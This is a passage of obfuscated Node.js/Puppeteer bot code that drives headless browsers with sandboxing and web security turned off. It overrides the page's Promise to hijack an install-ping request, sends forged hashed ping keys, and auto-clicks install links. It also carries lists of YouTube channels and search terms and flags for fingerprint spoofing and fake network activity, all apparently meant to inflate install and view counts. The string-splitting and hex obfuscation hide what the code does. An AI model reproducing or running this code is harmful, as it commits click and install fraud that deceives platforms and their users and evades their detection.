                J[-0x13f8 + 0x54b * -0x3 + 0x13d * 0x1d] = this['block'], J[K >> 0x2390 + -0xb * 0xfc + -0x2 * 0xc5d] |= x[0x978 * -0x4 + -0x2111 * -0x1 + 0x4d2 & K], this['block'] = J[-0x232d + 0x1d2 + 0x216b], K >= -0xc02 + 0x250 * 0x2 + 0x79a && (this['hashed'] || this['hash'](), J[0x9fe + -0x1 * 0x204f + 0x1 * 0x1651] = this['block'], J[-0x1491 + 0x17f * -0x11 + 0x10c * 0x2c] = J[-0x2402 + 0x18be * -0x1 + 0x3cc1] = J[0x1556 + 0x89b + -0x1def * 0x1] = J[-0x49 * -0x49 + 0x61 * 0x4 + 0x1652 * -0x1] = J[0x1 * -0x3a9 + -0xa * 0x128 + 0x53 * 0x2f] = J[0x1ed9 + -0x1 * -0x6b8 + -0x258c] = J[-0x11a2 + -0xcc6 + 0x1e6e] = J[-0x1490 + 0x3cb * 0x5 + 0x1a0] = J[0x21d1 * 0x1 + -0xa * 0xcf + -0x19b3] = J[-0x51f + -0x136c + 0x1894] = J[-0x7fc + 0x379 * 0x1 + -0x48d * -0x1] = J[-0x86e + 0x73 * -0x4b + 0x2a2a] = J[0xaed + 0x222f + -0x2d10] = J[-0x1 * 0xaf9 + 0x486 + 0x680] = J[0x1757 + 0x1 * 0xb86 + -0x22cf] = J[0x25e * -0x1 + 0x1864 + -0x15f7] = -0xa * 0x3e0 + 0x2 * 0x77e + -0xa9 * -0x24), J[-0x148 + 0xb92 + -0xa3c] = this['hBytes'] << 0x1411 + 0x806 + -0x4ae * 0x6 | this['bytes'] >>> -0x981 + 0x3 * -0xb03 + 0x2aa7, J[-0x16dc + 0x1135 + 0x2db * 0x2] = this['bytes'] << 0x17b3 + -0x2433 + 0xc83, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1071 + 0x46a + 0xc17; J < 0x1c12 + 0x5d1 * 0x5 + -0x1 * 0x38d7; ++J)
                K = Q[J - (-0x2a * -0xa1 + 0xd8e + -0x27f5)] ^ Q[J - (-0x3dd * 0x1 + -0x1d7b + 0x2160)] ^ Q[J - (0x25a1 + -0x16da + -0xeb9)] ^ Q[J - (-0x37d + 0x246b + -0x20de)], Q[J] = K << 0xfc6 * 0x1 + 0x1586 + -0x254b | K >>> -0x14b8 + -0x1a0 + 0x1677;
              for (J = 0x2468 * -0x1 + 0x16ca + 0xe * 0xf9; J < -0x1435 * -0x1 + -0x5f * 0x49 + 0x6f6; J += -0x8 * 0x2bd + 0x12f * 0x16 + -0x41d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x9 * -0x5d + -0x22f1 + -0x1fb1 * -0x1 | L >>> 0x1206 + -0x1c55 + -0x1f * -0x56) + (M & N | ~M & O) + P + (0x2f320279 * -0x1 + 0xa4a6ab * -0x75 + 0xd4f4a839) + Q[J] << -0xadb + -0x224 * 0x5 + 0x158f * 0x1) << -0x1f9d * 0x1 + -0x2092 + 0x496 * 0xe | P >>> 0x1508 * -0x1 + -0xf25 + 0x2448) + (L & (M = M << -0x1b03 + -0x10c1 + 0x2be2 | M >>> -0x17d * -0xd + -0x2491 + 0x113a) | ~L & N) + O + (0x1307dcc1 + 0x2 * 0x589e53b7 + -0x69c20a96) + Q[J + (0x1676 + 0x18 * 0xa0 + -0x2575)] << -0x79 * -0x44 + 0x1 * -0x63a + -0x19ea) << 0x1f04 + 0x22ad + -0x41ac | O >>> 0x23ba + -0x8 * 0x449 + -0x157) + (P & (L = L << 0x1e48 + -0x68 * 0x5d + 0x79e | L >>> 0x18d * -0x2 + -0x204f * -0x1 + -0x1d33) | ~P & M) + N + (-0x14f3 * -0x80622 + 0x2 * -0x208c96f5 + -0x7 * 0x1c8b065) + Q[J + (-0x2592 + -0x8a6 * -0x4 + 0x2fc)] << 0xa3d + 0x24ca + -0xfad * 0x3) << -0x807 + 0x21d5 + 0x7 * -0x3af | N >>> -0x185 * 0x1 + -0x1772 + 0x1912 * 0x1) + (O & (P = P << -0xe59 + -0xf9f + 0x1 * 0x1e16 | P >>> 0x1 * 0x14b3 + -0x1 * 0x214b + -0x2 * -0x64d) | ~O & L) + M + (-0x1 * 0x9530aaf3 + 0x7 * -0x65a539a + 0x11c2b6dc2) + Q[J + (-0x1055 + 0xb * -0xca + -0x1 * -0x1906)] << 0xd1f + 0x195b + 0xa * -0x3d9) << -0x1ee7 + -0x3 * -0x9d1 + -0x1d * -0xd | M >>> 0x203 * 0x13 + 0x25e0 + 0x1 * -0x4bfe) + (N & (O = O << -0x1a1e + 0x24 * -0xbb + -0x691 * -0x8 | O >>> -0x56e + -0xa3 * 0x2b + 0x20d1 * 0x1) | ~N & P) + L + (-0x4ea3ad2e + 0x3c25077e + 0x6d011f49) + Q[J + (-0x57a + -0xde9 + 0x1367)] << 0x1c88 + 0xad8 + 0x1c * -0x168, N = N << -0x180d + -0x1725 + 0x2f50 | N >>> -0x1 * 0xb47 + -0x4 * -0x13c + -0xd * -0x7d;
              for (; J < 0x19e6 + -0x1 * -0x242f + -0x53 * 0xbf; J += -0x1e73 + 0x1a3 * -0x16 + 0x427a * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xb76 + -0x680 * -0x2 + 0x1 * -0x1871 | L >>> 0xc2 + -0x1937 + 0x1890) + (M ^ N ^ O) + P + (-0x185 * 0x1fdf2e + 0xa60003ae + -0x6b7f727) + Q[J] << -0x22b0 + -0xefd + 0x31ad) << 0x1c09 + 0x42 * 0x3e + -0x2 * 0x1600 | P >>> -0x147 * 0x6 + 0x1fb8 + -0x1 * 0x17f3) + (L ^ (M = M << 0x9ca + 0x1291 + -0x1c3d | M >>> 0xa3 * 0x1e + -0x195c + 0x644) ^ N) + O + (-0x47c972b * 0x14 + -0x33de2d22 * 0x4 + 0x1980e6f85) + Q[J + (-0x225a + 0xb6c + -0x39 * -0x67)] << -0xbce + 0x208d + -0x14bf) << 0x55 * 0x55 + 0xf30 + -0x2b64 * 0x1 | O >>> 0x1 * 0x2ba + 0x9c7 + -0x45 * 0x2e) + (P ^ (L = L << -0x1971 + 0x13e7 * -0x1 + 0x2d76 | L >>> 0x43 * -0xc + 0x543 * 0x1 + -0x1 * 0x21d) ^ M) + N + (-0xdfb8f49 + 0x8727dac5 + -0xa525fdb) + Q[J + (0x1db0 + -0xb3 * -0x3 + -0x5 * 0x65b)] << -0x246e + -0x2a1 * -0x4 + 0x19ea) << -0x9 * 0x111 + 0x3b1 + -0x5ed * -0x1 | N >>> -0x1ebe + 0x54c + 0x1 * 0x198d) + (O ^ (P = P << -0xcd6 * -0x1 + -0x4a2 * -0x2 + -0x15fc | P >>> 0x1 * -0x4dc + 0xd * -0x83 + -0xb85 * -0x1) ^ L) + M + (-0xb480b484 + 0x1f240a * 0x544 + 0x7f60db7d) + Q[J + (-0xec9 + 0x963 * 0x3 + -0xd5d)] << 0x1294 + -0x47 * 0x14 + -0xd08) << 0xc * 0x1a5 + 0x1 * 0xa06 + -0x1dbd | M >>> -0x1 * 0x1c31 + -0x2285 * -0x1 + -0x1 * 0x639) + (N ^ (O = O << 0x1914 + 0x1857 + -0x314d | O >>> 0x3 * -0xbf5 + -0x1 * -0x173f + -0xe7 * -0xe) ^ P) + L + (0x1 * 0x1c61f441 + 0x1596b91a * 0x1 + 0x3ce13e46) + Q[J + (-0x6 * 0x527 + -0x2207 + 0x40f5)] << 0xab3 + -0x7cf + -0x2e4, N = N << 0x303 + 0x13 * 0xd3 + 0x2 * -0x947 | N >>> -0x1 * -0x1a52 + 0x1558 + 0x131 * -0x28;
              for (; J < -0x1fb + 0x287 * 0xf + -0x23b2; J += 0x1698 + -0x4a5 + -0x11ee)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x138e * -0x1 + -0x285 * -0x5 + 0xab6 * -0x3 | L >>> 0x24d5 + 0x25 * -0xff + 0x21 * 0x1) + (M & N | M & O | N & O) + P - (-0x5 * -0x2b29ca2d + 0x3133cfe * -0x2e + 0x268845e7) + Q[J] << -0x3d * 0x59 + 0x111 + 0x1424) << 0xd02 + -0x1c8 + -0xb35 | P >>> 0x1988 + -0x2b * 0xb5 + 0x4fa) + (L & (M = M << 0x115 * 0x4 + 0x1b93 + -0x1fc9 * 0x1 | M >>> -0x246 * -0x1 + 0x1 * 0x16d3 + -0x1917) | L & N | M & N) + O - (-0x3cff074d + 0x1 * 0xae79b071 + -0x966600) + Q[J + (0x240 * 0x3 + 0xa7 * -0x5 + -0x37c)] << 0x509 + 0x2696 + 0x2b9f * -0x1) << 0x1 * 0x877 + 0x3c2 + -0x11c * 0xb | O >>> 0x1 * -0x1360 + 0x26b * -0x4 + -0x1 * -0x1d27) + (P & (L = L << -0x48 * -0x8 + -0x1a * 0x37 + 0x1a * 0x22 | L >>> 0x23fa + -0x1d * 0x24 + 0x13a * -0x1a) | P & M | L & M) + N - (0xc198e402 + -0x9c1d * 0x15dbd + 0x5371 * 0x196bb) + Q[J + (-0x1 * 0x1d45 + 0x1cec + 0x5b)] << 0x1aff + 0x39 * -0x1d + 0x1 * -0x148a) << 0x103d + 0x9e3 * 0x1 + 0x29 * -0xa3 | N >>> 0x1 * -0x2547 + -0x2f * 0x55 + 0x34fd) + (O & (P = P << 0x4af * 0x1 + 0x234 + -0x6c5 | P >>> -0x1 * 0x965 + 0x25fa + -0x1c93) | O & L | P & L) + M - (-0x501470 * 0x269 + 0x5c50c75b + 0xd594bdb9 * 0x1) + Q[J + (-0x26d2 + 0x10f2 + -0xd * -0x1af)] << -0xd41 + 0x1bb7 + -0x6 * 0x269) << 0x1cc4 + 0xc76 * -0x1 + -0x1049 | M >>> -0xa * -0x351 + -0x242e * -0x1 + -0x453d) + (N & (O = O << 0x25 * 0xc2 + 0xa47 * -0x2 + -0x75e | O >>> 0x1079 + -0x3 * -0x621 + -0x22da) | N & P | O & P) + L - (-0x1a1180d8 + 0xaab * 0x12a4f1 + -0x3befd2ff) + Q[J + (-0xcd3 + 0x1dc0 + -0x10e9)] << -0x1f6e + -0x1 * -0x1a5b + 0x513, N = N << -0x1356 + 0x7a * 0x14 + 0x14 * 0x7f | N >>> 0x1f7 * -0xf + 0x111 + 0x1c6a;
              for (; J < -0x17e4 + -0x104b + -0x287f * -0x1; J += -0x8 * 0x29 + 0x23ed + -0x22a0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2203 + -0xab + -0x8d * -0x3f | L >>> -0x111 + 0x265b * -0x1 + 0x2787) + (M ^ N ^ O) + P - (0x3aff88ba + 0x2985c72c + -0x2ee811bc) + Q[J] << -0x1633 + 0x1a71 + -0x43e) << -0xde * 0x1d + 0x5 * -0x78b + 0x3ee2 | P >>> -0x11 + 0x1cd * -0x3 + 0x593) + (L ^ (M = M << 0xe * 0xe3 + -0x1b0a + 0xebe | M >>> 0x1a81 + 0x1caa + 0x9 * -0x621) ^ N) + O - (-0x5de6dd4f * 0x1 + -0x1 * -0x18762d05 + 0x91 * 0xd94134) + Q[J + (-0x3 * 0xc06 + 0xdcc + 0x1647)] << 0x242a + 0x2a * -0x63 + -0x154 * 0xf) << -0x1df8 + 0x1c91 * -0x1 + 0x3a8e | O >>> -0x18f + 0x2588 + 0x11ef * -0x2) + (P ^ (L = L << -0x1e97 + 0x2c8 + 0x1bed | L >>> 0x47c + -0x1254 + -0x12 * -0xc5) ^ M) + N - (-0x476b4c0d + 0x6315679 + -0x76d733be * -0x1) + Q[J + (0x5b * 0x20 + 0x2 * 0x565 + -0x2 * 0xb14)] << 0xfbd + 0x498 + -0x15b * 0xf) << 0x1c2b + 0x2 * 0x11ce + -0x3fc2 | N >>> 0x6f7 * -0x3 + -0x1ae3 + 0x2fe3) + (O ^ (P = P << 0x18f8 + -0x9 * 0x311 + -0x13 * -0x25 | P >>> -0x1f43 + -0x516 + 0xe3 * 0x29) ^ L) + M - (-0x1acc1746 + -0x2e3b4fb9 + 0x7ea4a529 * 0x1) + Q[J + (0xa19 + -0x212f + 0xdb * 0x1b)] << 0x1a0c + 0x1cff + -0x370b) << 0x2405 + -0x1a + 0x1 * -0x23e6 | M >>> 0x1410 + 0x23b8 + -0x37ad) + (N ^ (O = O << 0x1f04 + -0x1 * -0x1183 + 0xf3 * -0x33 | O >>> -0x30b + -0x336 * -0x8 + 0x1 * -0x16a3) ^ P) + L - (0x11 * 0x1587cd + 0x186cd7 + 0x3416ccb6) + Q[J + (-0x2 * 0x185 + 0x1 * 0xa97 + 0x1 * -0x789)] << 0x1f46 + -0x3e2 + -0x1b64, N = N << -0x23be + -0x260f + 0x49eb | N >>> 0xe49 * 0x1 + -0x2492 + 0xd * 0x1b7;
              this['h0'] = this['h0'] + L << 0x1 * -0x2e7 + -0xd * -0x62 + -0x213, this['h1'] = this['h1'] + M << 0x755 + 0x6 * -0x648 + 0x1 * 0x1e5b, this['h2'] = this['h2'] + N << 0xe * 0x2b + -0xb49 + 0x8ef, this['h3'] = this['h3'] + O << 0x543 * -0x5 + 0x17f * -0x11 + 0x33be * 0x1, this['h4'] = this['h4'] + P << 0x21c7 * 0x1 + 0x121e + 0x33e5 * -0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1481 + 0xdd * 0x2d + -0x123c & -0x1 * -0x14b6 + 0xc52 * -0x1 + -0x3 * 0x2c7] + w[J >> -0xc25 * -0x2 + -0x162 + 0x16d0 * -0x1 & -0x1bcc + 0x319 * -0x4 + -0x283f * -0x1] + w[J >> 0xd2b * -0x1 + 0x1 * -0x252d + 0x326c & 0x2677 + 0x7c7 + 0x7 * -0x699] + w[J >> -0x210f + -0xcbd + 0x2ddc & -0xc5e * -0x1 + 0x13 * 0xa6 + -0x18a1] + w[J >> -0x1 * -0x2332 + 0x4 * -0x5f2 + -0x1 * 0xb5e & -0x1a8a + -0x23c3 + 0x266 * 0x1a] + w[J >> 0x23 * -0xe + 0xb61 + -0x96f & -0x6af + 0x1f4 + 0x4ca] + w[J >> -0x270f + -0x1f1f + 0x1e * 0x257 & 0xf1b + 0x2be + -0x11ca] + w[-0xe * -0x123 + -0x4 * 0x88c + 0x1255 * 0x1 & J] + w[K >> -0x1 * 0x846 + -0x277 * -0x2 + -0x22 * -0x1a & 0x1f * 0x1d + -0x1fb7 + -0x1 * -0x1c43] + w[K >> -0x200a * 0x1 + 0x13 + -0x200f * -0x1 & -0x2402 + 0xc87 + -0x1 * -0x178a] + w[K >> 0x2 * 0xb31 + -0x117a + 0x26a * -0x2 & -0x177 * -0x12 + 0x472 + -0x1 * 0x1ec1] + w[K >> 0xc43 + -0x257b + 0x1948 & 0x1bd + 0x7ea + -0x998] + w[K >> -0x11 * 0x57 + 0x4 * 0x243 + -0x1 * 0x339 & 0x5 * -0x166 + -0x1 * 0x1ee2 + 0x25ef] + w[K >> 0x1897 + -0x122a + 0x1 * -0x665 & 0x4c6 * -0x5 + 0x52 * 0x16 + 0x10e1] + w[K >> -0x12fd + 0x1d * -0xd4 + 0x2b05 & -0x459 + 0x1 * -0x1571 + -0xd * -0x1fd] + w[-0x15 * -0x137 + -0x4c0 + -0x14b4 & K] + w[L >> 0x1 * -0x1669 + -0x483 + 0x28 * 0xad & 0x53 * 0x3 + -0x145 * 0x12 + -0x9c * -0x24] + w[L >> -0xd9d + 0x61b * -0x4 + 0x2621 & -0x43 * 0x27 + 0x1077 + -0x633] + w[L >> -0x23fc + -0x13d2 + 0x2 * 0x1bf1 & -0x1aa6 + 0x15aa + 0x50b * 0x1] + w[L >> -0x22 * -0xdd + -0xa27 * -0x1 + -0x17 * 0x1b7 & -0x18bc * -0x1 + 0x442 + -0x1cef] + w[L >> 0x205a + 0x11eb * 0x2 + 0x26f * -0x1c & -0x2a5 + 0x12f3 + -0x103f] + w[L >> -0x43 * 0x2f + -0x822 * -0x1 + -0x19 * -0x2b & -0x21b7 + 0x181e + -0x3 * -0x338] + w[L >> 0xa4d * -0x2 + 0x2419 + -0xf7b * 0x1 & 0x1df0 + 0x142 + 0x3 * -0xa61] + w[-0x2168 + 0xc4a + -0x8b * -0x27 & L] + w[M >> 0x1c63 + 0x11c + -0x1d63 & 0x13a2 + -0x3ef * -0x4 + -0x234f] + w[M >> 0x4 * -0x3b7 + 0x2398 + -0x14a4 & -0x1 * -0x2589 + -0xf68 + -0x1612] + w[M >> -0x1f57 + -0x3 * 0x7f7 + 0x3750 & 0x5 * -0x115 + -0x2101 + 0x2679] + w[M >> 0x59 * -0x22 + -0x659 + -0x123b * -0x1 & -0x2598 + -0x1d * 0x43 + 0x2d3e] + w[M >> 0x680 + 0x55c + -0xbd0 & 0x1 * 0xeed + 0xb08 + -0x1 * 0x19e6] + w[M >> 0x1 * -0x21b9 + -0xd71 + 0x35f * 0xe & -0x5b1 + 0x1 * 0x59 + -0x1 * -0x567] + w[M >> 0x7cd * 0x5 + 0x9 * 0x3b2 + -0x483f & 0x19db + 0x760 + -0x212c] + w[0x91f * -0x4 + 0x1 * -0x18f1 + -0x3d7c * -0x1 & M] + w[N >> 0xcb5 + -0x1962 + -0xcc9 * -0x1 & 0x210 * -0x2 + -0x12c8 * 0x1 + 0x16f7] + w[N >> -0x99 * -0x25 + -0x1fa + -0x140b & 0x67e + -0x3ce + -0x1 * 0x2a1] + w[N >> 0x44b + -0x2 * -0xd58 + -0x1ee7 & -0x1f3 + -0x20b5 + 0x22b7] + w[N >> 0x6b6 * -0x1 + 0x4 * 0x590 + -0xf7a & -0x112 * 0x18 + -0x1f26 + 0x38e5] + w[N >> -0xf9e + 0x121 + 0xe89 & 0x4 * 0x611 + 0x2162 + -0x281 * 0x17] + w[N >> -0x11e2 + 0x1217 + -0x3 * 0xf & -0x3e * -0x86 + 0x162f + -0x3694] + w[N >> -0xa8e + 0x235c + -0x18ca & -0x2146 + 0x5ec + 0x1b69] + w[0x1778 + -0x16e3 + -0x86 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1 * -0x1a83 + 0x4 * -0x51a + 0x2f03 & 0x4c3 * 0x7 + 0x221b + -0x1 * 0x4271,
                J >> -0x16e6 + -0x8 * -0x272 + -0x1e * -0x1d & 0x1 * 0xfda + 0x3 * -0x187 + -0xa46,
                J >> 0xa6f + -0x39 * -0x26 + -0x12dd & -0x103d + -0x29 * -0x98 + -0x71c,
                -0x2508 + 0x56 * 0x2e + 0x1693 & J,
                K >> -0x312 + 0x8de + 0x92 * -0xa & -0x13 * -0xce + 0x16a2 + 0x24ed * -0x1,
                K >> 0x1fe8 + -0x1a7 * 0xb + -0xdab & -0x1b5c + -0x10c * 0x4 + 0x208b,
                K >> 0x24ef + -0xa82 + -0x1a65 & -0x67f * -0x3 + 0x1bac + -0x2e2a,
                0x36 * 0x32 + -0x6f5 + 0x14c * -0x2 & K,
                L >> -0x783 + 0xf2f * -0x1 + -0x1 * -0x16ca & -0x1b8e + 0x20f + 0x1a7e,
                L >> -0x3 * -0x47f + 0x3c2 + -0x112f & -0x4b3 + 0x1527 + -0xf75 * 0x1,
                L >> 0x1 * -0x9d9 + -0x13e * -0x4 + -0x3 * -0x1a3 & 0x125 * -0x10 + 0x17f6 * 0x1 + -0x4a7,
                0x37 * 0xa6 + 0x2 * 0x657 + -0x2f59 & L,
                M >> 0x1e88 + 0x7 * -0x143 + -0x159b & 0x1dfc + 0x173 * -0xd + -0xa26,
                M >> 0x1fdb + 0xd04 + -0x2ccf & -0x1 * -0x13cb + -0x1520 + 0x254,
                M >> -0x107a + -0x1 * 0x1196 + 0x2218 & 0xbb2 + -0xb88 + -0x47 * -0x3,
                0x35b + -0xf6a * -0x1 + 0x5b * -0x32 & M,
                N >> 0x9 * 0x40c + -0x175a + 0xcfa * -0x1 & -0x1268 + -0x2086 + 0x33ed,
                N >> 0x4fb + 0xcbb * 0x1 + -0x3 * 0x5e2 & -0x24a4 + 0x517 * -0x5 + 0x3f16,
                N >> -0x2 * 0xf90 + 0x1d82 + -0x1a6 * -0x1 & -0x1048 * 0x1 + -0x2510 + 0x3657 * 0x1,
                0xb * -0x1ef + -0x3eb + 0x1a2f & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x3b6 + 0x1c9a + 0x101e * -0x2), (K = new DataView(J))['setUint32'](0x2401 * 0x1 + 0x4c9 * -0x1 + -0x1f38, this['h0']), K['setUint32'](0xcc3 + -0x32f * 0x9 + -0x7f4 * -0x2, this['h1']), K['setUint32'](0x1 * 0xb51 + -0x1138 + -0x7 * -0xd9, this['h2']), K['setUint32'](-0x2342 + -0xb6a * -0x1 + -0x16 * -0x116, this['h3']), K['setUint32'](-0xff1 + 0x33d * 0x7 + 0x355 * -0x2, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x8 * -0x35e + -0x116e + -0x982];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x210c + 0xff1 + 0x111b;
            J[-0x194d + -0x268 * 0xa + 0x315d]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x81b + 0x2173 + 0x36 * -0xc5] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0xa * -0xd4 + 0x1c1f + -0x13d6), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xdf7 + 0x267c + 0x77e * -0x7;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1 * 0xfad + 0x14cf * 0x1 + -0x1ea0), Promise['resolve'](0x84d + -0x566 * -0x4 + -0x1de4);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x4 * 0x406 + 0x2681 * -0x1 + 0x1669; j < -0xf1c + -0x1 * 0x1763 + 0x2680; j++)
    i();
}
const NETWORK_PATIENCE = 0xf94 + 0x3b * -0x109 + 0x4cbf + (0x13b8 + 0x905 * 0x1 + -0x1105) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1f * 0xb3 + -0x2004 + 0x35b4) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + V(0x0) + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + W(0x18, 't((R') + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x2365 + 0x1 * -0x8bf + -0x6 * 0x471; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + V(0x1a) + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + W(0x10, 'PGHg') + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x25ba + 0x2 * 0x33b + -0x2c26)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x7f6 + -0x3 * 0x707 + -0x5 * -0x5d1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 